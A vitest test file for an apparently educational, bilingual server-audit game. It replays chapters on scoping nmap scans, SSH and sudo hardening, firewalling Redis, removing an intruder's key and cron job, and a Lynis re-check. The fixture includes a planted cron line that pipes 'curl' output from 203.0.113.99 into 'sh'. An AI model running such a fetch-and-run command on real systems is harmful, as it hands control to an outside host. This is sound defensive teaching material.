// L'Audit : le serveur du Fournil (le périmètre, le rapport, l'exposition, les
// traces, la contre-visite).
// Rejoué avec la console, dans chaque langue.

import { describe, expect, it } from 'vitest';
import { Console } from '../src/moteur/console';
import { HISTOIRES } from '../src/moteur/chapitres';
import { LANGUES, LANGUE_DE_REFERENCE, traducteur } from '../src/textes';
import { dansLaLangue } from './noms';

const EFFACEUR = HISTOIRES.find((h) => h.id === 'effaceur')!.chapitres.map((c) => c.id);
const MDP = 'farine-2028';

for (const langue of LANGUES)
  describe(`L'Audit — ${langue}`, () => {
    const fr = langue === LANGUE_DE_REFERENCE;
    const L = (ligne: string) => dansLaLangue(traducteur(langue), ligne);
    const contient = (tout: string, texte: string) => fr && expect(tout).toContain(texte);
    const partie = (termines: string[] = []) => {
      const c = new Console({ langue, termines: [...EFFACEUR, ...termines] });
      const une = (l: string) => {
        let sortie = c.executer(L(l)) ?? '';
        if (c.shell.attente) sortie += '\n' + (c.executer(MDP) ?? '');
        return sortie;
      };
      const jouer = (lignes: string[]) => lignes.map(une).join('\n');
      const editer = (commande: string, changer: (texte: string) => string) => {
        une(commande);
        c.enregistrer(changer(c.edition!.texte));
        return c.quitterEdition();
      };
      jouer(['ssh fournil', 'yes']);
      return { c, jouer, editer };
    };

    it('Salomé ne relit qu’après un enregistrement, pas à la première commande ; nmap -h donne l’aide', () => {
      const t = traducteur(langue);
      const { jouer } = partie();
      const tout = jouer(['ls', 'nmap -h']);
      expect(tout).not.toContain(t('perimetre-relecture'));
      expect(tout).not.toContain('invalid option');
      contient(tout, 'Utilisation : nmap');
      // Une adresse hors de la lettre, mais pas celle du voisin : le message dit laquelle, sans parler du voisin.
      const ailleurs = partie().jouer(['nmap 203.0.113.5']);
      expect(ailleurs).toContain('203.0.113.5');
      contient(ailleurs, 'pas dans ta lettre');
      if (fr) expect(ailleurs).not.toContain('voisin');
      const contre = partie(['perimetre', 'rapport', 'exposition', 'traces']);
      expect(contre.jouer(['ls'])).not.toContain(t('contre-visite-relecture'));
    });

    it('chapitre 2 — solution : root fermé, Lucas supprimé, sudo avec mot de passe, secret en 600', () => {
      const { c, jouer, editer } = partie(['perimetre']);
      let tout = jouer(['cat rapport-audit.txt', 'sudo -l', 'ls -l /srv/commandes']);
      contient(tout, 'RAPPORT D\'AUDIT');
      expect(tout).toContain('NOPASSWD');
      // Au début, aucun constat n'est traité.
      for (const id of ['ssh', 'compte', 'sudo', 'secret']) expect(c.shell.drapeaux.has(id), id).toBe(false);
      editer('sudo nano /etc/ssh/sshd_config', (t) => t.replace('PermitRootLogin yes', 'PermitRootLogin no'));
      jouer(['sudo sshd -t', 'sudo systemctl reload ssh']);
      expect(c.termines).not.toContain('rapport');
      jouer(['sudo userdel lucas', 'sudo rm /etc/sudoers.d/90-cloud-init-users', 'sudo chmod 600 /srv/commandes/.env']);
      tout = jouer(['sudo -l']);
      expect(tout).not.toContain('NOPASSWD');
      expect(c.termines).toContain('rapport');
    });

    it('chapitre 2 — une autre solution : verrouiller et expirer Lucas, visudo, chmod 640', () => {
      const { c, jouer, editer } = partie(['perimetre']);
      editer('sudo nano /etc/ssh/sshd_config', (t) => t.replace('PermitRootLogin yes', 'PermitRootLogin no'));
      jouer(['sudo systemctl reload ssh', 'sudo usermod -L -e 1 lucas', 'sudo gpasswd -d lucas sudo']);
      editer('sudo nano /etc/sudoers.d/90-cloud-init-users', () => 'vous ALL=(ALL) ALL');
      jouer(['sudo chmod 640 /srv/commandes/.env']);
      expect(c.termines).toContain('rapport');
    });

    it('chapitre 2 — fausses pistes : fichier modifié sans recharger, compte à moitié fermé, secret fermé à l’appli', () => {
      const { c, jouer, editer } = partie(['perimetre']);
      const e = (id: string) => c.shell.drapeaux.has(id);
      editer('sudo nano /etc/ssh/sshd_config', (t) => t.replace('PermitRootLogin yes', 'PermitRootLogin no'));
      expect(e('sans-effet')).toBe(true);
      jouer(['sudo usermod -L lucas']);
      expect(e('compte-incomplet')).toBe(true);
      jouer(['sudo chown root:root /srv/commandes/.env', 'sudo chmod 600 /srv/commandes/.env']);
      expect(e('appli-aveugle')).toBe(true);
      expect(c.termines).not.toContain('rapport');
    });

    
    const REDIS = '/etc/redis/redis.conf';
    const redisLocal = (t: string) => t.replace('bind * -::*', 'bind 127.0.0.1 -::1');

    it('chapitre 3 — solution : ss, ufw (SSH et le site d’abord), Redis en local, reconnexion', () => {
      const { c, jouer, editer } = partie(['perimetre', 'rapport']);
      let tout = jouer(['cat balayage-audit.txt', 'sudo ss -tlnp']);
      expect(tout).toContain('0.0.0.0:6379');
      expect(tout).toContain('127.0.0.1:3000');
      jouer(['sudo ufw allow OpenSSH', 'sudo ufw allow "Nginx Full"', 'sudo ufw enable', 'y']);
      expect(c.termines).not.toContain('exposition');
      editer(`sudo nano ${REDIS}`, redisLocal);
      jouer(['sudo systemctl restart redis-server']);
      tout = jouer(['sudo ss -tln', 'sudo ufw status verbose']);
      expect(tout).toContain('127.0.0.1:6379');
      expect(c.termines).not.toContain('exposition');
      jouer(['exit', 'ssh fournil']);
      expect(c.termines).toContain('exposition');
    });

    it('chapitre 3 — une autre solution : règles par numéro de port, SSH depuis le poste seulement', () => {
      const { c, jouer, editer } = partie(['perimetre', 'rapport']);
      editer(`sudo nano ${REDIS}`, (t) => t.replace('bind * -::*', 'bind 127.0.0.1'));
      jouer([
        'sudo systemctl restart redis-server',
        'sudo ufw default deny incoming',
        'sudo ufw allow from 192.0.2.2 to any port 22 proto tcp',
        'sudo ufw allow 80/tcp',
        'sudo ufw allow 443/tcp',
        'sudo ufw enable',
        'y',
        'exit',
        'ssh fournil',
      ]);
      expect(c.termines).toContain('exposition');
    });

    it('chapitre 3 — fausses pistes : activer sans SSH, couper le site, tout autoriser, arrêter Redis, oublier le redémarrage', () => {
      const { c, jouer, editer } = partie(['perimetre', 'rapport']);
      const e = (id: string) => c.shell.drapeaux.has(id);
      jouer(['sudo ufw allow 80/tcp', 'sudo ufw allow 443/tcp', 'sudo ufw enable', 'y']);
      expect(e('enferme')).toBe(true);
      jouer(['sudo ufw disable', 'sudo ufw delete allow 80/tcp', 'sudo ufw allow OpenSSH', 'sudo ufw enable', 'y']);
      expect(e('site-coupe')).toBe(true);
      jouer(['sudo ufw allow 80/tcp', 'sudo ufw allow 443/tcp', 'sudo ufw allow 6379/tcp']);
      expect(e('base-ouverte')).toBe(true);
      jouer(['sudo systemctl stop redis-server']);
      expect(e('redis-arrete')).toBe(true);
      jouer(['sudo systemctl start redis-server']);
      editer(`sudo nano ${REDIS}`, redisLocal);
      expect(e('sans-effet')).toBe(true);
      expect(c.termines).not.toContain('exposition');
    });

    
    const CLES = '/home/nadia/.ssh/authorized_keys';
    const ENV = '/srv/commandes/.env';
    const NOUVEAU = 'baguette-tradition-2028-champagne';
    const sansIntruse = (t: string) => t.split('\n').filter((l) => !l.includes('nadia@portable')).join('\n');
    const sansBalise = (t: string) => t.split('\n').filter((l) => !l.includes('203.0.113.99')).join('\n');

    it('chapitre 4 — solution : journal, last, empreinte, clé retirée, crontab nettoyée', () => {
      const { c, jouer, editer } = partie(['perimetre', 'rapport', 'exposition']);
      let tout = jouer(['last nadia', 'journalctl -u ssh | grep Accepted']);
      expect(tout).toContain('203.0.113.99');
      expect(tout).toContain('Accepted publickey for nadia from 203.0.113.99 port 52144 ssh2: ED25519 SHA256:');
      tout = jouer([`sudo ssh-keygen -l -f ${CLES}`]);
      expect(tout).toContain('nadia@boutique (ED25519)');
      expect(tout).toContain('nadia@portable (ED25519)');
      editer(`sudo nano ${CLES}`, sansIntruse);
      expect(c.termines).not.toContain('traces');
      tout = jouer(['sudo crontab -u nadia -l']);
      expect(tout).toContain('curl -fsS http://203.0.113.99/b | sh');
      editer('sudo crontab -u nadia -e', sansBalise);
      tout = jouer(['sudo crontab -u nadia -l']);
      expect(tout).toContain('sauvegarde.sh');
      expect(tout).not.toContain('203.0.113.99');
      // L'intrus a lu le secret : le mot de passe se change des deux côtés, puis l'appli est relancée.
      expect(c.termines).not.toContain('traces');
      expect(jouer(['sudo cat /home/nadia/.bash_history'])).toContain('cat /srv/commandes/.env');
      expect(jouer([`sudo -u postgres psql -c "ALTER ROLE commandes PASSWORD '${NOUVEAU}'"`])).toContain('ALTER ROLE');
      editer(`sudo nano ${ENV}`, (t) => t.replace('brioche-beurre-91', NOUVEAU));
      expect(c.termines).not.toContain('traces');
      jouer(['sudo systemctl restart commandes']);
      expect(jouer(['systemctl is-active commandes'])).toContain('active');
      expect(c.termines).toContain('traces');
    });

    it('chapitre 4 — le mot de passe : trop court, un seul côté, oublier de relancer', () => {
      const { c, jouer, editer } = partie(['perimetre', 'rapport', 'exposition']);
      const e = (id: string) => c.shell.drapeaux.has(id);
      editer(`sudo nano ${CLES}`, sansIntruse);
      editer('sudo crontab -u nadia -e', sansBalise);
      expect(jouer(['psql -c "ALTER ROLE commandes PASSWORD \'x\'"'])).toContain('does not exist');
      jouer([`sudo -u postgres psql -c "ALTER ROLE commandes PASSWORD 'court'"`]);
      expect(e('mot-de-passe-faible')).toBe(true);
      // Un seul côté : la base a changé, pas .env — l'appli ne repart plus.
      jouer([`sudo -u postgres psql -c "ALTER ROLE commandes PASSWORD '${NOUVEAU}'"`, 'sudo systemctl restart commandes']);
      expect(e('appli-tombee')).toBe(true);
      expect(jouer(['sudo journalctl -u commandes -n 5'])).toContain('password authentication failed');
      // Les deux côtés d'accord, mais pas relancée : elle garde l'ancien mot de passe en mémoire.
      editer(`sudo nano ${ENV}`, (t) => t.replace('brioche-beurre-91', NOUVEAU));
      jouer(['sudo systemctl restart commandes']);
      expect(c.termines).toContain('traces');
      // Le même cas sans redémarrage : « à redémarrer ».
      const b = partie(['perimetre', 'rapport', 'exposition']);
      b.editer(`sudo nano ${CLES}`, sansIntruse);
      b.editer('sudo crontab -u nadia -e', sansBalise);
      b.jouer([`sudo -u postgres psql -c "ALTER ROLE commandes PASSWORD '${NOUVEAU}'"`]);
      b.editer(`sudo nano ${ENV}`, (t) => t.replace('brioche-beurre-91', NOUVEAU));
      expect(b.c.shell.drapeaux.has('a-redemarrer')).toBe(true);
      expect(b.c.termines).not.toContain('traces');
    });

    it('chapitre 4 — fausses pistes : tout effacer (Nadia dehors, sauvegarde perdue)', () => {
      const { c, jouer, editer } = partie(['perimetre', 'rapport', 'exposition']);
      const e = (id: string) => c.shell.drapeaux.has(id);
      editer(`sudo nano ${CLES}`, () => '');
      expect(e('nadia-enfermee')).toBe(true);
      editer(`sudo nano ${CLES}`, (t) => t + '\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA x@y');
      jouer(['sudo crontab -u nadia -r']);
      expect(e('sauvegarde-perdue')).toBe(true);
      expect(c.termines).not.toContain('traces');
    });

    // ——— Le chapitre 1, « Le périmètre » ———
    const NOTES = (hors: string) => `# ${fr ? 'Notes' : 'Notes'}
## ${fr ? 'Périmètre' : 'Scope'}
${fr ? 'Seulement le serveur fournil (192.0.2.22), comme la lettre de mission.' : 'Only the fournil server (192.0.2.22), as in the letter of engagement.'}
## ${fr ? "Ce que j'ai trouvé" : 'What I found'}
${fr ? 'Vus d’internet : SSH (22), le site (80, 443), mais aussi PostgreSQL (5432) et Redis (6379).' : 'Seen from the internet: SSH (22), the website (80, 443), but also PostgreSQL (5432) and Redis (6379).'}
## ${fr ? 'Hors périmètre' : 'Out of scope'}
${hors}`;
    const HORS = fr ? 'Le serveur du voisin (192.0.2.24) : hors périmètre, je ne l’ai pas sondé.' : 'The neighbour’s server (192.0.2.24): out of scope, I did not probe it.';

    it('chapitre 1 — solution : la lettre, nmap -sV -oN, des notes honnêtes', () => {
      const { c, jouer, editer } = partie();
      let tout = jouer(['cat lettre-de-mission.txt']);
      contient(tout, 'LETTRE DE MISSION');
      tout = jouer(['nmap -sV -oN inventaire.txt fournil.internal']);
      expect(tout).toContain('Nmap scan report for fournil.internal (192.0.2.22)');
      expect(tout).toContain('Not shown: 995 closed tcp ports (reset)');
      expect(tout).toContain('5432/tcp open  postgresql PostgreSQL DB 17.0 - 17.2');
      expect(tout).toContain('443/tcp  open  ssl/http   nginx 1.26.3');
      expect(tout).toContain('Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel');
      expect(tout).toContain('Nmap done: 1 IP address (1 host up) scanned in');
      tout = jouer(['cat inventaire.txt']);
      expect(tout).toMatch(/^# Nmap 7\.95 scan initiated .* as: nmap -sV -oN \S+ fournil\.internal/);
      expect(tout).toMatch(/# Nmap done at .* -- 1 IP address \(1 host up\) scanned in/);
      expect(c.termines).not.toContain('perimetre');
      const relecture = editer('nano notes-audit.md', (t) => t.replace(/\(à compléter[^\n]*|\(to complete[^\n]*/, 'x'));
      contient(relecture, 'Salomé relit tes notes');
      editer('nano notes-audit.md', () => NOTES(HORS));
      expect(c.termines).toContain('perimetre');
      expect(c.shell.drapeaux.has('hors-perimetre')).toBe(false);
    });

    it('chapitre 1 — fausse piste : balayer tout le réseau sonde le voisin (la faute, racontée dans le débrief)', () => {
      const { c, jouer, editer } = partie();
      const tout = jouer(['nmap -sV -oN inventaire.txt 192.0.2.16/28']);
      expect(tout).toContain('Nmap scan report for voisin.internal (192.0.2.24)');
      expect(tout).toContain('3306/tcp open  mysql   MariaDB 10.11.6');
      expect(tout).toContain('Nmap done: 16 IP addresses (2 hosts up) scanned in');
      expect(c.shell.drapeaux.has('hors-perimetre')).toBe(true);
      expect(c.shell.drapeaux.has('trace')).toBe(true);
      const fin = editer('nano notes-audit.md', () => NOTES(HORS));
      contient(fin, 'ton balayage a aussi sondé l\'adresse du voisin');
      expect(c.termines).toContain('perimetre');
    });

    it('chapitre 1 — notes incomplètes : les ports, le voisin, « hors périmètre »', () => {
      const { c, editer } = partie();
      const sans = editer('nano notes-audit.md', () => NOTES(fr ? 'Rien.' : 'Nothing.'));
      contient(sans, 'Il manque la machine que tu as repérée');
      const mi = editer('nano notes-audit.md', () => NOTES(fr ? 'Le serveur du voisin (192.0.2.24).' : 'The neighbour’s server (192.0.2.24).'));
      contient(mi, 'dis aussi que c\'est hors périmètre');
      expect(c.termines).not.toContain('perimetre');
    });

    it('nmap — messages : sans cible, option inconnue, machine muette, nom inconnu, -sn, -p', () => {
      const { jouer } = partie();
      expect(jouer(['nmap'])).toContain('WARNING: No targets were specified, so 0 hosts scanned.');
      expect(jouer(['nmap -z fournil.internal'])).toContain("nmap: invalid option -- 'z'");
      expect(jouer(['nmap --frobnicate fournil.internal'])).toContain("nmap: unrecognized option '--frobnicate'");
      const muette = jouer(['nmap 192.0.2.99']);
      expect(muette).toContain('Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn');
      expect(muette).toContain('Nmap done: 1 IP address (0 hosts up) scanned in');
      expect(jouer(['nmap inconnue.internal'])).toContain('Failed to resolve "inconnue.internal".');
      expect(jouer(['nmap -sn fournil.internal'])).toContain('Host is up (0.011s latency).');
      const ports = jouer(['nmap -p 22,3306 fournil.internal']);
      expect(ports).toContain('22/tcp   open   ssh');
      expect(ports).toContain('3306/tcp closed mysql');
      expect(jouer(['nmap -sS fournil.internal'])).toContain('requires root privileges');
      expect(jouer(['sudo nmap -sS fournil.internal'])).toContain('22/tcp');
      expect(jouer(['nmap -V'])).toContain('Nmap version 7.95');
    });

    // ——— Le chapitre 5, « La contre-visite » ———
    const TOUS = ['perimetre', 'rapport', 'exposition', 'traces'];
    const RAPPORT = (indice: string) => `# ${fr ? 'Rapport de clôture' : 'Closing report'}
## ${fr ? 'Résumé' : 'Summary'}
${fr ? 'Les quatre parties du rapport sont corrigées et vérifiées : le serveur est nettement mieux protégé.' : 'The four parts of the report are fixed and verified: the server is much better protected.'}
## ${fr ? 'Constats corrigés' : 'Findings fixed'}
${fr ? '- SSH : root ne peut plus entrer.\n- Le compte de Lucas est supprimé.\n- sudo demande un mot de passe.\n- Le fichier .env est fermé (secret).\n- ufw est actif et Redis écoute en local.\n- La clé de l’intrus et sa tâche cron sont retirées.' : '- SSH: root can no longer log in.\n- Lucas’s account is deleted.\n- sudo asks for a password.\n- The .env file is closed (secret).\n- ufw is active and Redis listens locally.\n- The intruder’s key and cron job are removed.'}
## ${fr ? 'Preuves' : 'Evidence'}
nmap -sV : ${fr ? 'seuls 22, 80 et 443 répondent.' : 'only 22, 80 and 443 answer.'} Lynis : ${fr ? 'indice de durcissement' : 'hardening index'} ${indice}.
## ${fr ? 'Reste à faire' : 'Still to do'}
${fr ? 'FINT-4350 : choisir et installer un outil d’intégrité des fichiers.' : 'FINT-4350: choose and install a file integrity tool.'}`;
    const durcir = (editer: (c: string, f: (t: string) => string) => string) => {
      editer('sudo nano /etc/ssh/sshd_config', (t) => t.replace('X11Forwarding yes', 'X11Forwarding no') + '\nMaxAuthTries 3\nAllowTcpForwarding no\nAllowAgentForwarding no\n');
    };

    it('chapitre 5 — solution : nmap, lynis, mise à jour, durcissement, preuves, rapport', () => {
      const { c, jouer, editer } = partie(TOUS);
      let tout = jouer(['nmap -sV fournil.internal']);
      expect(tout).toContain('Not shown: 997 filtered tcp ports (no-response)');
      expect(tout).toContain('22/tcp  open  ssh      OpenSSH 10.0p1 Debian 7 (protocol 2.0)');
      expect(tout).not.toContain('5432/tcp');
      tout = jouer(['sudo lynis audit system']);
      expect(tout).toContain('Hardening index : 60 [############        ]');
      expect(tout).toContain('! Found one or more vulnerable packages. [PKGS-7392]');
      expect(tout).toContain('  - Details  : X11Forwarding (set YES to NO)');
      expect(jouer(['sudo grep hardening_index /var/log/lynis-report.dat'])).toContain('hardening_index=60');
      jouer(['sudo apt upgrade -y']);
      durcir(editer);
      jouer(['sudo sshd -t', 'sudo systemctl reload ssh']);
      tout = jouer(['sudo lynis audit system']);
      expect(tout).toContain('Hardening index : 80 [################    ]');
      expect(tout).not.toContain('Warnings (');
      tout = jouer(['nmap -sV fournil.internal']);
      expect(tout).toContain('OpenSSH 10.0p1 Debian 7+deb13u1 (protocol 2.0)');
      expect(c.termines).not.toContain('contre-visite');
      editer('nano rapport-cloture.md', () => RAPPORT('80'));
      expect(c.termines).toContain('contre-visite');
    });

    it('chapitre 5 — une autre voie : l’avertissement et une seule suggestion suffisent (indice 71)', () => {
      const { c, jouer, editer } = partie(TOUS);
      jouer(['sudo apt update', 'sudo apt upgrade -y']);
      editer('sudo nano /etc/login.defs', (t) => t.replace('UMASK           022', 'UMASK           027'));
      jouer(['sudo lynis audit system', 'nmap -sV fournil.internal']);
      expect(c.shell.etat.lynis.indice).toBe(72);
      editer('nano rapport-cloture.md', () => RAPPORT('72'));
      expect(c.termines).toContain('contre-visite');
    });

    it('chapitre 5 — fausses pistes : la configuration sans recharger, le rapport sans chiffre, un balayage hors périmètre', () => {
      const { c, jouer, editer } = partie(TOUS);
      const e = (id: string) => c.shell.drapeaux.has(id);
      jouer(['sudo apt upgrade -y']);
      expect(e('mise-a-jour')).toBe(true);
      durcir(editer);
      expect(e('ssh-a-recharger')).toBe(true);
      expect(e('durci')).toBe(false);
      jouer(['sudo systemctl reload ssh']);
      expect(e('durci')).toBe(true);
      // Sans nouvel audit, Lynis n'a rien prouvé : l'ancien indice n'est plus celui de la machine.
      jouer(['sudo lynis audit system']);
      expect(e('preuve-lynis')).toBe(true);
      const sans = editer('nano rapport-cloture.md', () => RAPPORT('12'));
      contient(sans, 'cite l\'indice de durcissement de ton dernier audit Lynis');
      jouer(['nmap -sV 192.0.2.16/28']);
      expect(e('hors-perimetre')).toBe(true);
      expect(c.termines).not.toContain('contre-visite');
    });

    it('lynis — messages : sans sudo, sans argument, la version ; le pare-feu change le balayage', () => {
      const { jouer } = partie(TOUS);
      contient(jouer(['lynis audit system']), 'Lynis a besoin de root');
      expect(jouer(['lynis show version'])).toBe('3.1.4');
      contient(jouer(['lynis']), 'Utilisation : lynis audit system');
      const ports = jouer(['nmap -p 22,5432,6379 fournil.internal']);
      expect(ports).toContain('5432/tcp filtered postgresql');
      expect(ports).toContain('6379/tcp filtered redis');
      const dedans = jouer(['nmap -p 5432,6379 127.0.0.1']);
      expect(dedans).toContain('5432/tcp open  postgresql');
      expect(dedans).toContain('6379/tcp open  redis');
    });
  });
